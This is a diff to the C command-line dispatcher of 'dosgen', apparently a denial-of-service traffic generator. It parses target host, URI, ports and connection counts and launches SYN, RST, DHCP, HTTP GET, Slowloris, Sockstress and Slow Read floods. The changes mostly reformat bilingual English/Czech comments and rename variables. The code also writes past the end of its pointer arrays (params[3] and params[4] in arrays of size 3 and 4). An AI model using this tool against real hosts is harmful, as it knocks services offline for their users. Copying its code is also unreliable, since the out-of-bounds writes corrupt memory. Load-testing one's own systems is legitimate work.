@@ -6,8 +6,7 @@
 #include <unistd.h> //sleep
 
 #include "libdos.h"
-#include "raw/handshake.h"
-#include "raw/tcpgenlib.h"
+//#include "tcpgen/tcpgenlib.h"
 
 void print_help_and_die()
 {
@@ -42,7 +41,7 @@ void print_help_and_die()
 		   "\t-H:\t Host name\n"
 		   "\t-U:\t URI\n"
 		   "\t-C:\t Number of connections\n\n"
-           "  Usage: ./dosgen -i <iface> <attack_type> -H <host name | IP> -U <URI>\n\n"); 
+           "  Usage: ./dosgen -i <iface> <attack_type> -H <host name | IP> -U <URI> -C <num of connections>\n\n"); 
     exit(100);
 }
 
@@ -75,15 +74,16 @@ void syn_flood(int argc, char **argv)
     int c;
     opterr = 0;
     	
-	// getopt() checks if following options were specified, ':' means that argument should follow options dsDSp/getopt() kontroluje zda byly specifikovany moznosti, ':' znamena, ze moznosti dsDSp by mel nasledovat nejaky argument
+	// getopt() checks if following options were specified, ':' means that argument should follow options dsDSp
+    // getopt() kontroluje zda byly specifikovany moznosti, ':' znamena, ze moznosti dsDSp by mel nasledovat nejaky argument
 	while ((c = getopt(argc, argv, "d:s:D:S:p:h")) != -1)
     {
         switch (c)
         {
         case 'd':
             dst_ip = optarg;
-            /* Changing "." to "," in typing in IP address - necessary for trafgen/Zmena "." za "," pri zadavani IP adresy,
-            nutne pro Trafgen */
+            // Changing "." to "," in typing in IP address - necessary for trafgen
+            // Zmena "." za "," pri zadavani IP adresy, nutne pro Trafgen
             str_replace(dst_ip, '.', ',');
             break;
         case 's':
@@ -103,7 +103,8 @@ void syn_flood(int argc, char **argv)
             print_help_and_die();
             break;
         default:
-			// If there was none of the above options specified, write to standard error output../Pokud nebyla specifikovana zadna z dostupnych moznosti, zapis do standartniho chyboveho vystupu 
+			// If there was none of the above options specified, write to standard error output and call help function
+            // Pokud nebyla specifikovana zadna z dostupnych moznosti, zapis do standartniho chyboveho vystupu a volej funkci pro napovedu
 			fprintf(stderr, "\n[-%c] is not a valid argument!\n\n", optopt);
             print_help_and_die();
         }
@@ -126,6 +127,8 @@ void syn_flood(int argc, char **argv)
         }
         else
         {
+            //atoi function needed for converting optarg src_port from char to int
+            //atoi funkce nutna pro prevod src_port ze retezce na integer
             sprintf(src_port_buffer, "const16(%d)", atoi(src_port));
             src_port = src_port_buffer;
         }
@@ -138,7 +141,8 @@ void syn_flood(int argc, char **argv)
             sprintf(dst_port_buffer, "const16(%d)", atoi(dst_port));
             dst_port = dst_port_buffer;
         }
-        // Creating the configuration packet for trafgen/Vytvoreni konfigurace paketu pro trafgen
+        // Creating the configuration packet for trafgen
+        // Vytvoreni konfigurace paketu pro trafgen
         char *err = prepare_syn(src_ip, src_port, dst_ip, dst_port, payload_len);
         if (err != NULL)
         {
@@ -194,7 +198,8 @@ void rst_flood(int argc, char **argv)
         }
     }
 
-// Generating unspecified options/Nahodne generovani nespecifikovanych moznosti
+// Generating unspecified options
+// Nahodne generovani nespecifikovanych moznosti
     if (dst_ip)
     {
         if (strcmp(src_ip, "rand") == 0)
@@ -550,7 +555,9 @@ void http_get_flood(int argc, char **argv, char *dev)
 	char *URI = NULL;
     char *connections = NULL;
 	int c;
-
+    
+    //Input arguments check
+    //Osetreni vstupnich argumentu
     if(argc < 5)
     {
         printf("\nNot enough arguments passed to --http\n");
@@ -582,15 +589,17 @@ void http_get_flood(int argc, char **argv, char *dev)
             print_help_and_die();
 		}
 	}
-    char *arguments[4];
-    arguments[0] = "http";
-    arguments[1] = host_name;
-    arguments[2] = URI;
-    arguments[3] = dev;
-    arguments[4] = connections;
+    //Filling char pointer array which will then be passed to tcp_gen function from libtcpgen
+    //Naplneni char pole pointeru, ktere je pak predano funkci tcp_gen z knihovny libtcpgen
+    char *params[4];
+    params[0] = "http";
+    params[1] = host_name;
+    params[2] = URI;
+    params[3] = dev;
+    params[4] = connections;
 
     argc = 5;    
-    tcp_gen(argc, arguments);
+    tcp_gen(argc, params);
 
 }
 //-------------------Slow Loris---------------------//
@@ -601,6 +610,8 @@ void slow_loris(int argc, char **argv, char *dev)
     char *connections = NULL;
 	int c;
 
+    //Slow loris function is handled similarly to http_get_flood
+    //Slow loris funkce je podobne resena jako http_get_flood
     if(argc < 5)
     {
         printf("\nNot enough arguments passed to --slowloris\n");
@@ -629,28 +640,15 @@ void slow_loris(int argc, char **argv, char *dev)
             print_help_and_die();
 		}
 	}
-    char *arguments[3];
-    arguments[0] = "slowloris";
-    arguments[1] = host_name;
-    arguments[2] = URI;
-    arguments[3] = dev;
-    arguments[4] = connections;
+    char *params[3];
+    params[0] = "slowloris";
+    params[1] = host_name;
+    params[2] = URI;
+    params[3] = dev;
+    params[4] = connections;
 
-    /*
-        struct attack_params {
-        u_char *args[3];
-        const u_char *a_packet;
-        };
-
-     */
-
-    //struct attack_params *slowloris1;
-    //slowloris1 = (struct attack_params *) malloc(sizeof(struct attack_params));
-    //slowloris1->args[0] = host_name;
-    //slowloris1->args[1] = URI;
-    //slowloris1->args[2] = dev;
     argc = 5;    
-    tcp_gen(argc, arguments);
+    tcp_gen(argc, params);
 
 }
 
@@ -661,6 +659,8 @@ void sock_stress(int argc, char **argv, char *dev)
     char *connections = NULL;
 	int c;
 
+    //Sock stress function is handled similarly to http_get_flood
+    //Sock stress funkce je podobne resena jako http_get_flood
     if(argc < 5)
     {
         printf("\nNot enough arguments passed to --sockstress\n");
@@ -689,15 +689,15 @@ void sock_stress(int argc, char **argv, char *dev)
             print_help_and_die();
 		}
 	}
-    char *arguments[3];
-    arguments[0] = "sockstress";
-    arguments[1] = host_name;
-    arguments[2] = URI;
-    arguments[3] = dev;
-    arguments[4] = connections;
+    char *params[3];
+    params[0] = "sockstress";
+    params[1] = host_name;
+    params[2] = URI;
+    params[3] = dev;
+    params[4] = connections;
 
     argc = 5;    
-    tcp_gen(argc, arguments);
+    tcp_gen(argc, params);
 
 }
 
@@ -708,6 +708,8 @@ void slow_read(int argc, char **argv, char *dev)
     char *connections = NULL;
 	int c;
 
+    //Slow read function is handled similarly to http_get_flood
+    //Slow read funkce je podobne resena jako http_get_flood
     if(argc < 5)
     {
         printf("\nNot enough arguments passed to --slowread\n");
@@ -736,19 +738,20 @@ void slow_read(int argc, char **argv, char *dev)
             print_help_and_die();
 		}
 	}
-    char *arguments[3];
-    arguments[0] = "slowread";
-    arguments[1] = host_name;
-    arguments[2] = URI;
-    arguments[3] = dev;
-    arguments[4] = connections;
+    char *params[3];
+    params[0] = "slowread";
+    params[1] = host_name;
+    params[2] = URI;
+    params[3] = dev;
+    params[4] = connections;
 
     argc = 5;    
-    tcp_gen(argc, arguments);
+    tcp_gen(argc, params);
 
 }
 
-// Vstup: argc, argv. Vystup: flood_type_index, flood_argc
+//Function finds '--' string which sets type of the attack and counts parameters
+//Funkce hleda '--' string ktery znaci typ utoku a spocita parametry
 bool find_flood(int argc, char **argv, int *flood_type_index, int *flood_argc)
 {
     while (1)
@@ -777,6 +780,8 @@ bool find_flood(int argc, char **argv, int *flood_type_index, int *flood_argc)
     return true;
 }
 
+//Main function of a program
+//Hlavni funkce programu
 int main(int argc, char **argv)
 {
 	if (argc < 4) {
@@ -793,16 +798,17 @@ int main(int argc, char **argv)
             break;
         }
         //Find point where --<name of the attack> begins and later pass it to find flood function
+        //Hleda misto kde zacina string --, znacici nazev utoku, index pak preda funkci find flood
         else if (strncmp(argv[i], "--", 2) == 0)
         {
             break;
         }
         //Increase i as long as strncmp at i position is not equal to --
+        //Zvysi i dokud strncmp na pozici i neni rovna --
         i++;
     }
     argc = i;
-    //printf("\nargc value is: %d\n", argc);
-    // long unsigned pps = 0;
+
     int proc_num = 0;
     char *dev = NULL;
 
@@ -829,12 +835,14 @@ int main(int argc, char **argv)
         }
     }
     //Num of cpu cores to run on
+    //Pocet cpu jader na kterych ma program bezet
     char proc_num_str[10];
     sprintf(proc_num_str, "%u", proc_num);
     /*char pps_str[10];
     sprintf(pps_str, "%u", pps);*/
 
-    // Checking if file exists and Deleting it/Zjisteni jestli soubor existuje a jeho vymazani
+    // Checking if file exists and deleting it
+    // Zjisteni jestli soubor existuje a jeho vymazani
     if(access("tmp.cfg", F_OK) != -1){
         if(remove("tmp.cfg") != 0)
             perror("\ntmp.cfg not deleted!\n");
@@ -843,6 +851,8 @@ int main(int argc, char **argv)
     argc = argc_orig;
     argv++;
     argc--;
+    //If set to true, tcpgen function will be used, otherwise trafgen will be used
+    //Pokud bude nastaveno na true, tcpgen funkce bude volana, jinak je zavolan trafgen
     bool tcp_attack = false;
 
     int flood_type_index = 0;
@@ -891,7 +901,8 @@ int main(int argc, char **argv)
         {
             dhcp_flood(flood_argc + 1, flood_argv);
         }
-        // For these attacks arguments needed are: <hostname> <URI> <iface>
+        // For following attacks device needs to be passed
+        // Pro tyto utoky je nutne predat i nazev zarizeni (eth0, wlan...)
         else if (strcmp(flood_type, "--http") == 0)
         {
             tcp_attack = true;
@@ -926,7 +937,8 @@ int main(int argc, char **argv)
         }
     }
 
-// Starting the atack/Zahajeni utoku
+// Starting the atack
+// Zahajeni utoku
     if(tcp_attack == false)
         start_attack(dev, proc_num_str); //pps_str
 
